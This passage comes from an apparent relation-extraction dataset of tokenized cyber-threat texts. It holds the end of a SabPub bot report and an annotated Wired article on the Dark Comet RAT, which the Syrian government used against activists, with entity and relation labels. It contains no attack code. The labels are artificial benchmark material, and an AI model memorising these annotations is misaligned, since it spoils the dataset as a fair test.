"for", "almost", "two", "months", "!"], ["The", "second", "variant", "of", "SabPub", "was", "created", "in", "March", "and", "the", "attackers", "are", "using", "Java", "exploits", "to", "infect"], ["target", "Mac", "OS", "X", "machines", "."], ["SabPub", "is", "still", "an", "active", "attack", "and", "we", "expect", "the", "attackers", "will", "release", "new", "variants", "of", "the", "bot", "with", "new"], ["C2s", "over", "the", "next", "days/weeks", "."], ["To", "summarize:"], ["-", "At", "least", "two", "variants", "of", "the", "SabPub", "bot", "exist", "today", "."], ["-", "The", "earliest", "version", "of", "the", "bot", "appears", "to", "have", "been", "created", "and", "used", "in", "February", "2012", "."], ["-", "The", "malware", "is", "being", "spread", "through", "Word", "documents", "that", "exploit", "the", "CVE-2009-0563", "vulnerability", "."], ["-", "SabPub", "is", "different", "from", "MaControl", ",", "another", "bot", "used", "in", "APT", "attacks", "in", "February", "2012;", "SabPub", "was"], ["more", "effective", "because", "it", "stayed", "undetected", "for", "more", "than", "1", ".", "5", "months", "."], ["-", "the", "APT", "behind", "SabPub", "is", "active", "at", "the", "time", "of", "writing", "."], ["*", "Thanks", "to", "Aleks", "Gostev", "and", "Igor", "Soumenkov", "for", "the", "analysis", "."]]}], [{"vertexSet": [{"old_id": "T1", "type": "Malware", "name": "Dark Comet", "sent_id": 8, "pos": []}, {"old_id": "T2", "type": "Attacker", "name": "Jean-Pierre Lesueur", "sent_id": 5, "pos": [1, 2]}, {"old_id": "T3", "type": "Attacker", "name": "Syrian government", "sent_id": 9, "pos": [8, 9]}, {"old_id": "T4", "type": "MalwareCharacteristics", "name": "keylogger", "sent_id": 22, "pos": [12]}, {"old_id": "T5", "type": "Malware", "name": "Dark Comet", "sent_id": 23, "pos": [9, 10]}, {"old_id": "T6", "type": "MalwareCharacteristics", "name": "recording video and audio", "sent_id": 24, "pos": [1, 4]}, {"old_id": "T7", "type": "ExploitTargetObject", "name": "critics of the regime of Syrian President Bashar Assad", "sent_id": 32, "pos": [0, 8]}, {"old_id": "T8", "type": "Person", "name": "Osama", "sent_id": 40, "pos": []}, {"old_id": "T9", "type": "ExploitTargetObject", "name": "activist in Damascus", "sent_id": 40, "pos": [8, 10]}, {"old_id": "T10", "type": "Malware", "name": "Blackshades", "sent_id": 74, "pos": [12]}, {"old_id": "T11", "type": "ExploitTargetObject", "name": "Syrian activists", "sent_id": 79, "pos": [10, 11]}], "labels": [{"old_id": "R1", "r": "P2", "h": 1, "t": 0, "evidence": [5, 6, 7, 8]}, {"old_id": "R2", "r": "P23", "h": 2, "t": 0, "evidence": []}, {"old_id": "R3", "r": "P13", "h": 4, "t": 3, "evidence": []}, {"old_id": "R4", "r": "P13", "h": 4, "t": 5, "evidence": [23, 24]}, {"old_id": "R5", "r": "P18", "h": 8, "t": 7, "evidence": [40]}], "title": ["inputs/txt/201207WiredDarkComet"], "sents": [["How", "the", "Boy", "Next", "Door", "Accidentally", "Built", "a", "Syrian", "Spy"], ["Tool"], ["wired", ".", "com/2012/07/dark-comet-syrian-spy-tool/"], ["Robert", "McMillan"], ["Jean-Pierre", "Lesueur", "."], ["Photo:", "Jean-Pierre", "Lesueur"], ["Jean-Pierre", "Lesueur", "is", "in", "many", "ways", "a", "typical", "22-year-old", "computer", "geek", ".", "He", "lives", "outside"], ["of", "Paris", ",", "coding", "Java", "by", "day", "for", "a", "European", "company", "that", "processes", "airline", "tickets", ".", "He"], ["likes", "playing", "the", "piano", "and", "reading", "Stephen", "Hawking", ".", "But", "he's", "also", "the", "man", "who", "built", "Dark"], ["Comet", "\u2013", "which", "was", "recently", "used", "by", "the", "Syrian", "government", "to", "steal", "information", "from", "the"], ["computers", "of", "activists", "fighting", "to", "overthrow", "it", "."], ["Dark", "Comet", "is", "a", "software", "application", "that", "gives", "you", "remote", "control", "over", "another", "computer", ","], ["and", "Lesueur", "says", "he", "wrote", "it", "just", "to", "prove", "his", "programming", "cred", ".", "That", "meant", "sharing", "the"], ["thing", "with", "the", "rest", "of", "the", "world", ",", "and", "after", "the", "Syrian", "government", "grabbed", "the", "tool", "from", "the"], ["net", ",", "Lesueur", "found", "himself", "at", "the", "center", "of", "an", "international", "firestorm", ".", "He", "spoke", "with", "Wired"], ["Tuesday", "via", "online", "chat", "."], ["Sometimes", ",", "the", "boy", "next", "door", "can", "become", "a", "tool", "in", "a", "state-sponsored", "cyberespionage"], ["campaign", ".", "That's", "the", "power", "of", "the", "internet", "."], ["Although", "it", "was", "first", "developed", "in", "2008", ",", "Dark", "Comet", "mostly", "stayed", "under", "the", "radar", "until", "it"], ["was", "linked", "to", "Syria", "earlier", "this", "year", ".", "Although", "Lesueur", "says", "he", "never", "intended", "it", "to", "be", "used"], ["illegally", ",", "Dark", "Comet", "is", "not", "the", "type", "of", "program", "anyone", "would", "want", "to", "discover", "on", "their", "PC", "."], ["1/3"], ["In", "short", ",", "it's", "a", "silent", "spying", "machine", ".", "There's", "a", "password-stealing", "keylogger", "and", "a", "feature"], ["that", "helps", "it", "avoid", "detection", "by", "antivirus", "products", ".", "Dark", "Comet", "can", "be", "used", "for", "spying", ",", "too", ","], ["quietly", "recording", "video", "and", "audio", "from", "a", "computer", "once", "it's", "installed", "."], ["According", "to", "Lesueur", ",", "Dark", "Comet", "is", "no", "worse", "than", "other", "hacking", "tools", "such", "as", "Metasploit"], ["or", "BackTrack", "Linux", ",", "which", "can", "be", "used", "both", "by", "legitimate", "security", "testers", "and", "criminals", "to"], ["launch", "online", "attacks", "against", "computers", "and", "test", "networks", "for", "security", "flaws", "."], ["Dlshad", "Othman", "first", "learned", "about", "Dark", "Comet", "in", "December", ",", "when", "a", "Syrian", "activist", "asked"], ["him", "to", "examine", "her", "computer", "after", "losing", "access", "to", "her", "e-mail", ",", "Skype", ",", "and", "Facebook"], ["account", ".", "After", "a", "scan", ",", "Othman", "discovered", "Dark", "Comet", "sitting", "on", "the", "machine's", "hard", "drive", "."], ["Dark", "Comet", "was", "another", "tool", "in", "an", "escalating", "computer", "espionage", "campaign", "targeting"], ["critics", "of", "the", "regime", "of", "Syrian", "President", "Bashar", "Assad", ".", "\"Because", "most", "of", "the", "Syrian", "people"], ["started", "to", "use", "secure", "connections", "and", "they", "[learned", "how", "to", "bypass]", "the", "censorship", "and"], ["surveillance", "of", "the", "internet", ",", "so", "the", "regime", "found", "it\u2019s", "better", "to", "use", "Trojans", "to", "arrest", "the"], ["people", ",", "\"", "says", "Othman", ",", "a", "Syrian", "activist", "and", "computer", "specialist", "who", "is", "also", "one", "of", "the", "U", ".", "S."], ["State", "Department's", "Internet", "Freedom", "Fellows", "."], ["He", "and", "other", "activists", "believe", "that", "the", "information", "stolen", "via", "Dark", "Comet", "led", "to", "many"], ["arrests", "within", "Syria", ".", "Once", "one", "computer", "is", "infected", ",", "hackers", "use", "that", "activist's", "computer", "as"], ["a", "stepping", "stone", "to", "try", "and", "infect", "others", ",", "typically", "by", "contacting", "them", "via", "Skype", "."], ["That's", "what", "happened", "to", "\"Osama", ",", "\"", "an", "activist", "in", "Damascus", "who", "declined", "to", "give", "his", "last"], ["name", ".", "About", "five", "months", "ago", ",", "a", "doctor", "friend", "of", "his", "received", "a", "file", "via", "Skype", "that", "appeared"], ["to", "have", "something", "to", "do", "with", "medicine", "and", "the", "Syrian", "revolution", ".", "\"His", "account", "started", "to"], ["send", "this", "file", "to", "his", "contacts", "(including", "me)", "and", "as", "he", "is", "a", "doctor", ",", "many", "of", "his", "contacts"], ["trusted", "this", "file", ",", "\"", "he", "said", "."], ["Osama", "doesn't", "know", "for", "certain", "that", "his", "friend", "was", "infected", "with", "Dark", "Comet", ",", "but", "it's", "very"], ["likely", "that", "he", "was", ".", "Researchers", "say", "that", "between", "November", "and", "May", ",", "this", "was", "a", "preferred"], ["remote", "access", "tool", "of", "the", "Syrian", "regime", "."], ["Morgan", "Marquis-Boire", "\u2013", "a", "researcher", "with", "Citizen", "Lab", ",", "a", "computer", "security", "research", "thinktank", "\u2013", "has", "identified", "16", "separate", "pieces", "of", "malicious", "software", "that", "use", "Dark", "Comet", "to"], ["send", "information", "back", "to", "computers", "located", "in", "Syria", ".", "Typically", "these", "are", "Trojan", "horse"], ["programs", ",", "designed", "to", "look", "like", "legitimate", "files", "that", "activists", "would", "want", "to", "read", ".", "The"], ["Trojan", "might", "look", "like", "a", "", ".", "pdf", "file", "or", "a", "Skype", "encryption", "tool", ",", "but", "it", "silently", "installs", "Dark"], ["Comet", "in", "the", "background", ".", "Dark", "Comet", "is", "known", "as", "a", "remote", "administration", "tool", ".", "Security"], ["experts", "call", "it", "a", "RAT", "."], ["Dark", "Comet", "was", "packaged", "with", "malicious", "software", "that", "would", "quietly", "install", "it", "when"], ["victims", "opened", "this", "", ".", "pdf."], ["Image:", "John", "Scott-Railton"], ["As", "word", "of", "Dark", "Comet's", "use", "got", "out", ",", "Lesueur's", "part-time", "project", "suddenly", "came", "under", "the"], ["spotlight", ".", "The", "Electronic", "Frontier", "Foundation", ",", "antivirus", "companies", ",", "and", "online", "activists"], ["\"kept", "up", "steady", "stream", "of", "postings", "and", "reports", "of", "the", "use", "of", "Dark", "Comet", "in", "Syria", ",", "\"", "says"], ["John", "Scott-Railton", ",", "a", "doctoral", "student", "at", "UCLA", "School", "of", "Public", "Affairs", "who", "has", "worked"], ["2/3"], ["closely", "on", "the", "issue", "of", "malicious", "software", "in", "Syria", ".", "\"I", "don't", "think", "that", "this", "amount", "of"], ["pressure", "has", "ever", "been", "placed", "on", "the", "developer", "of", "a", "RAT", "before", ".", "I", "can't", "imagine", "that"], ["[Lesueur]", "expected", "anything", "like", "this", "to", "come", "from", "his", "project", ".", "\""], ["At", "first", ",", "Lesueur", "wrote", "a", "removal", "tool", ",", "so", "victims", "could", "uninstall", "Dark", "Comet", ",", "but", "he", "kept"], ["the", "project", "alive", ".", "But", "by", "the", "end", "of", "June", ",", "he", "was", "afraid", ".", "Though", "he", "wasn't", "the", "one", "doing", "the"], ["illegal", "activity", ",", "it", "was", "clear", "that", "his", "software", "was", "being", "misused", "\u2013", "not", "just", "by", "the", "Syrian"], ["government", ",", "but", "by", "untalented", "hackers", "Lesueur", "calls", "\"script-kiddies", ".", "\""], ["He", "started", "to", "worry", "about", "being", "arrested", ".", "So", "on", "June", "28", ",", "he", "took", "down", "Dark", "Comet", "", ".", "\"I"], ["removed", "all", "before", "one", "day", "it", "happened", ",", "\"", "he", "says", ".", "\"I", "don't", "want", "to", "lose", "my", "life", "for", "such", "a"], ["little", "thing", ".", "\""], ["Lesueur", "says", "the", "Syrian", "use", "was", "a", "factor", "in", "his", "decision", "to", "pull", "Dark", "Comet", ",", "but", "not", "the", "only"], ["one", ".", "He", "won't", "spell", "out", "the", "exact", "reason", "he", "was", "worried", "about", "his", "arrest", ",", "but", "two", "days"], ["earlier", ",", "one", "of", "the", "apparent", "authors", "of", "another", "remote-access", "tool", "called", "Blackshades", "was"], ["arrested", "in", "Tuscon", ",", "Arizona", ",", "on", "hacking", "and", "malware", "distribution", "charges", ".", "That", "arrest", "may"], ["have", "scared", "Lesueur", ",", "says", "Kevin", "Mitnick", ",", "a", "well-known", "information", "security", "consultant", "."], ["Lesueur", "says", "that", "it", "did", "not", "affect", "his", "decision", ".", "\"The", "Blackshades", "author", "was", "in", "charge", "of", "a"], ["carding", "operation", ",", "\"", "he", "says", ".", "\"It's", "not", "the", "same", ".", "\""], ["Blackshades", ",", "coincidentally", ",", "is", "now", "being", "used", "against", "the", "Syrian", "activists", "much", "in", "the"], ["same", "way", "that", "Dark", "Comet", "was", ",", "says", "Marquis-Boire", "."], ["Mitnick", ",", "who", "has", "used", "Dark", "Comet", "in", "security", "demonstrations", ",", "doesn't", "think", "Leseur", "should"], ["have", "abandoned", "his", "tool", "because", "it", "was", "being", "used", "illegally", ".", "\"I", "don't", "think", "that's", "a", "good"], ["reason", "to", "stop", "development", "on", "it", ",", "because", "you", "always", "have", "bad", "actors", ",", "\"", "he", "says", ".", "\"That's"], ["just", "a", "fact", "of", "life", ".", "\""], ["This", "isn't", "the", "first", "time", "that", "a", "software", "developer", "has", "dropped", "a", "tool", "after", "getting", "some"], ["heat", ".", "But", "what's", "unusual", "is", "that", "Lesueur", "has", "been", "remarkably", "candid", "about", "everything", ","], ["using", "his", "real", "name", ",", "talking", "about", "himself", "in", "detail", ",", "and", "explaining", "why", "he", "created", "the", "tool", "."], ["Lesueur", "\u2013", "who", "cut", "his", "teeth", "in", "a", "underground", "Trojan", "and", "RAT-writing", "forum", "called", "OpenSC"], ["\u2013", "says", "that", "although", "he", "made", "about", "2", ",", "000", "euros", "offering", "technical", "support", "for", "Dark", "Comet", ","], ["he", "didn't", "charge", "for", "the", "software", "and", "was", "never", "in", "it", "for", "the", "money", ".", "He's", "now", "working", "on", "a"], ["new", "remote", "access", "tool", "that", "doesn't", "include", "the", "controversial", "spying", "features", "that", "were", "in"], ["Dark", "Comet", "."], ["After", "Lesueur", "pulled", "Dark", "Comet", ",", "Kevin", "Mitnick", "asked", "him", "if", "he'd", "ever", "consider", "selling", "the"], ["source", "code", "to", "the", "tool", ".", "Lesueur", "said", "no", ".", "\"I", "don\u2019t", "think", "he", "was", "out", "for", "money", ",", "\"", "Mitnick", "says", "."], ["\"I", "don't", "think", "he", "was", "doing", "anything", "illegal", ".", "\""], ["Lesueur", "says", "he", "just", "wanted", "to", "make", "a", "name", "for", "himself", "in", "the", "hacker", "scene", ".", "\"The", "whole"], ["development", "process", "of", "Dark", "Comet", "was", "a", "challenge", "for", "myself", ",", "\"", "he", "says", "."], ["\"I", "never", "imagined", "it", "would", "be", "used", "by", "a", "government", "for", "spying", ",", "\"", "he", "said", ".", "\"If", "I", "had", "known"], ["that", ",", "I", "would", "never", "have", "created", "such", "a", "tool", ".", "\""], ["3/3"]]}]]